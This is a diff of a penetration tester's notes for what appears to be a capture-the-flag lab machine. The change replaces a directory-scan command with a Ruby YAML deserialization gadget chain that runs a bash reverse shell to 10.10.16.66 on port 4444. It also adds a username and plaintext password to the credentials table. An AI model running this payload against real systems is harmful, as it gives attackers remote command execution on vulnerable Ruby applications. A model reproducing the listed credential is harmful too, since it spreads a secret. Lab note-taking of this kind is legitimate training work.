@@ -17,7 +17,26 @@ dv.paragraph("```bash\n" + command + "\n```");
 Editing Box
 
 ```
-feroxbuster -u http://10.129.233.95/nibbleblog -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,html,txt,bak,zip -t 80
+---
+- !ruby/object:Gem::Installer
+    i: x
+- !ruby/object:Gem::SpecFetcher
+    i: y
+- !ruby/object:Gem::Requirement
+  requirements:
+    !ruby/object:Gem::Package::TarReader
+    io: &1 !ruby/object:Net::BufferedIO
+      io: &1 !ruby/object:Gem::Package::TarReader::Entry
+         read: 0
+         header: "abc"
+      debug_output: &1 !ruby/object:Net::WriteAdapter
+         socket: &1 !ruby/object:Gem::RequestSet
+             sets: !ruby/object:Net::WriteAdapter
+                 socket: !ruby/module 'Kernel'
+                 method_id: :system
+             git_set: /bin/bash -c 'bash -i >& /dev/tcp/10.10.16.66/4444 0>&1'
+         method_id: :resolve
+
 ```
 
 wget from local python server
@@ -34,9 +53,9 @@ dv.paragraph("```bash\n" + command + "\n```");
 ## Provided Credentials
 ---
 
-| Username | Password | Notes |
-| -------- | -------- | ----- |
-|          |          |       |
+| Username | Password           | Notes |
+| -------- | ------------------ | ----- |
+| henry:   | Q3c1AqGHtoI0aXAYFH |       |
 
 ---
 
@@ -44,10 +63,10 @@ dv.paragraph("```bash\n" + command + "\n```");
 ## Open Ports
 ---
 
-| Port | Service | Notes |
-| ---- | ------- | ----- |
-| 22   | ssh     |       |
-| 80   | http    |       |
+| Port | Service | Notes |     |
+| ---- | ------- | ----- | --- |
+| 22   | ssh     |       |     |
+| 80   | http    |       |     |
 
 ---
 
